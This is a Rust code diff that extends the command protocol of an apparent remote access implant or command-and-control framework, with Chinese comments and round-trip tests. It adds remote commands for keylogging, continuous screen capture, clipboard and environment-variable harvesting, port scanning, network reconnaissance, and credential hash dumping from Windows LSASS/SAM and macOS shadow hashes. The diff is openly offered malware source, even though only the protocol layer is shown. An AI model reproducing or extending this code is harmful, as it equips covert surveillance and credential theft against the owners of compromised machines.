@@ -99,6 +99,64 @@ pub enum Command {
         addr: String,
         port: u16,
     },
+    /// 文件系统操作：cd / mkdir / rm / mv / cp。
+    /// `dest` 仅 Mv/Cp 需要，其余为 None。
+    FileOp {
+        op: FileOp,
+        path: String,
+        dest: Option<String>,
+    },
+    /// 截屏。`monitor` 0=主屏，返回 PNG 数据（Response::Image）。
+    Screenshot { monitor: u8 },
+    /// 端口扫描。扫描 `host` 的 `ports`（逗号分隔，如 "22,80,443" 或 "1-1000"）。
+    Portscan { host: String, ports: String },
+    /// 网络信息收集（ifconfig/arp/netstat/route）。
+    Net { query: String },
+    /// 磁盘/分区信息（df/diskutil）。
+    DriveInfo,
+    /// 读取剪贴板内容。
+    Clipboard,
+    /// 环境变量收集。`name` 空=全部，否则取单个变量。
+    Env { name: String },
+    /// 键盘记录。`action` 0=start, 1=stop, 2=dump（返回已捕获的键）。
+    Keylog { action: u8 },
+    /// 持续截屏（定时截图，`interval_secs` 秒一张）。
+    Screenwatch { interval_secs: u32 },
+    /// 凭据哈希提取。`method` 0=SAM(LSASS), 1=hashdump(macOS shadow hash)。
+    Hashdump { method: u8 },
+}
+
+/// 文件操作的种类（u8 tag 0-4）。
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum FileOp {
+    Cd,
+    Mkdir,
+    Rm,
+    Mv,
+    Cp,
+}
+
+impl FileOp {
+    pub fn encode(self, w: &mut Writer) {
+        w.u8(match self {
+            FileOp::Cd => 0,
+            FileOp::Mkdir => 1,
+            FileOp::Rm => 2,
+            FileOp::Mv => 3,
+            FileOp::Cp => 4,
+        });
+    }
+
+    pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
+        Ok(match r.u8()? {
+            0 => FileOp::Cd,
+            1 => FileOp::Mkdir,
+            2 => FileOp::Rm,
+            3 => FileOp::Mv,
+            4 => FileOp::Cp,
+            t => return Err(WireError::BadTag(t)),
+        })
+    }
 }
 
 impl Command {
@@ -157,6 +215,49 @@ impl Command {
                 w.str(addr);
                 w.u16(*port);
             }
+            Command::FileOp { op, path, dest } => {
+                w.u8(10);
+                op.encode(w);
+                w.str(path);
+                match dest {
+                    Some(d) => {
+                        w.u8(1);
+                        w.str(d);
+                    }
+                    None => w.u8(0),
+                }
+            }
+            Command::Screenshot { monitor } => {
+                w.u8(11);
+                w.u8(*monitor);
+            }
+            Command::Portscan { host, ports } => {
+                w.u8(12);
+                w.str(host);
+                w.str(ports);
+            }
+            Command::Net { query } => {
+                w.u8(13);
+                w.str(query);
+            }
+            Command::DriveInfo => w.u8(14),
+            Command::Clipboard => w.u8(15),
+            Command::Env { name } => {
+                w.u8(16);
+                w.str(name);
+            }
+            Command::Keylog { action } => {
+                w.u8(17);
+                w.u8(*action);
+            }
+            Command::Screenwatch { interval_secs } => {
+                w.u8(18);
+                w.u32(*interval_secs);
+            }
+            Command::Hashdump { method } => {
+                w.u8(19);
+                w.u8(*method);
+            }
         }
     }
 
@@ -198,6 +299,28 @@ impl Command {
                 addr: r.str()?,
                 port: r.u16()?,
             },
+            10 => {
+                let op = FileOp::decode(r)?;
+                let path = r.str()?;
+                let dest = if r.u8()? == 1 {
+                    Some(r.str()?)
+                } else {
+                    None
+                };
+                Command::FileOp { op, path, dest }
+            }
+            11 => Command::Screenshot { monitor: r.u8()? },
+            12 => Command::Portscan {
+                host: r.str()?,
+                ports: r.str()?,
+            },
+            13 => Command::Net { query: r.str()? },
+            14 => Command::DriveInfo,
+            15 => Command::Clipboard,
+            16 => Command::Env { name: r.str()? },
+            17 => Command::Keylog { action: r.u8()? },
+            18 => Command::Screenwatch { interval_secs: r.u32()? },
+            19 => Command::Hashdump { method: r.u8()? },
             t => return Err(WireError::BadTag(t)),
         })
     }
@@ -227,6 +350,8 @@ pub enum Response {
         status: u8,
         data: Vec<u8>,
     },
+    /// 截屏图像数据（PNG 字节流）。
+    Image(Vec<u8>),
 }
 
 impl Response {
@@ -262,6 +387,10 @@ impl Response {
                 w.u8(*status);
                 w.blob(data);
             }
+            Response::Image(d) => {
+                w.u8(7);
+                w.blob(d);
+            }
         }
     }
 
@@ -282,6 +411,7 @@ impl Response {
                 status: r.u8()?,
                 data: r.blob()?.to_vec(),
             },
+            7 => Response::Image(r.blob()?.to_vec()),
             t => return Err(WireError::BadTag(t)),
         })
     }
@@ -367,5 +497,112 @@ impl TaskResponse {
             out.push(TaskResponse::decode(&mut r)?);
         }
         Ok(out)
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// 编码再解码一个 Command，验证 round-trip 相等。
+    fn round_trip(cmd: Command) -> Command {
+        let mut w = Writer::new();
+        cmd.encode(&mut w);
+        let bytes = w.into_bytes();
+        let mut r = Reader::new(&bytes);
+        Command::decode(&mut r).expect("decode 应成功")
+    }
+
+    #[test]
+    fn fileop_mkdir_roundtrips() {
+        let cmd = Command::FileOp { op: FileOp::Mkdir, path: "/tmp/x".into(), dest: None };
+        assert_eq!(round_trip(cmd.clone()), cmd);
+    }
+
+    #[test]
+    fn fileop_mv_roundtrips_with_dest() {
+        let cmd = Command::FileOp {
+            op: FileOp::Mv,
+            path: "/tmp/a".into(),
+            dest: Some("/tmp/b".into()),
+        };
+        assert_eq!(round_trip(cmd.clone()), cmd);
+    }
+
+    #[test]
+    fn fileop_all_variants_roundtrip() {
+        let ops = [FileOp::Cd, FileOp::Mkdir, FileOp::Rm, FileOp::Mv, FileOp::Cp];
+        for op in ops {
+            let cmd = Command::FileOp { op, path: "p".into(), dest: Some("d".into()) };
+            assert_eq!(round_trip(cmd.clone()), cmd, "FileOp::{op:?} roundtrip 失败");
+        }
+    }
+
+    #[test]
+    fn connect_and_socks_still_roundtrip() {
+        let connect = Command::Connect { proto: 0, host: "10.0.0.1".into(), port: 445, chan: 7 };
+        assert_eq!(round_trip(connect.clone()), connect);
+        let socks = Command::Socks { chan: 7, op: 1, addr: "127.0.0.1".into(), port: 8080 };
+        assert_eq!(round_trip(socks.clone()), socks);
+    }
+
+    #[test]
+    fn bad_fileop_tag_errors() {
+        let mut w = Writer::new();
+        w.u8(10);
+        w.u8(99);
+        let bytes = w.into_bytes();
+        let mut r = Reader::new(&bytes);
+        assert!(matches!(Command::decode(&mut r), Err(WireError::BadTag(99))));
+    }
+
+    #[test]
+    fn screenshot_roundtrips() {
+        let cmd = Command::Screenshot { monitor: 0 };
+        assert_eq!(round_trip(cmd.clone()), cmd);
+        let cmd = Command::Screenshot { monitor: 2 };
+        assert_eq!(round_trip(cmd.clone()), cmd);
+    }
+
+    #[test]
+    fn portscan_roundtrips() {
+        let cmd = Command::Portscan { host: "10.0.0.0/24".into(), ports: "22,80,443".into() };
+        assert_eq!(round_trip(cmd.clone()), cmd);
+    }
+
+    #[test]
+    fn net_driveinfo_clipboard_env_roundtrip() {
+        let net = Command::Net { query: "ifconfig".into() };
+        assert_eq!(round_trip(net.clone()), net);
+        assert_eq!(round_trip(Command::DriveInfo), Command::DriveInfo);
+        assert_eq!(round_trip(Command::Clipboard), Command::Clipboard);
+        let env = Command::Env { name: "PATH".into() };
+        assert_eq!(round_trip(env.clone()), env);
+        let env_all = Command::Env { name: String::new() };
+        assert_eq!(round_trip(env_all.clone()), env_all);
+    }
+
+    #[test]
+    fn response_image_roundtrips() {
+        let png = vec![0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A]; // PNG header
+        let resp = Response::Image(png.clone());
+        let mut w = Writer::new();
+        resp.encode(&mut w);
+        let bytes = w.into_bytes();
+        let mut r = Reader::new(&bytes);
+        let decoded = Response::decode(&mut r).unwrap();
+        assert_eq!(decoded, Response::Image(png));
+    }
+
+    #[test]
+    fn keylog_screenwatch_hashdump_roundtrip() {
+        let kl = Command::Keylog { action: 0 };
+        assert_eq!(round_trip(kl.clone()), kl);
+        let kl_stop = Command::Keylog { action: 1 };
+        assert_eq!(round_trip(kl_stop.clone()), kl_stop);
+        let sw = Command::Screenwatch { interval_secs: 30 };
+        assert_eq!(round_trip(sw.clone()), sw);
+        let hd = Command::Hashdump { method: 0 };
+        assert_eq!(round_trip(hd.clone()), hd);
     }
 }
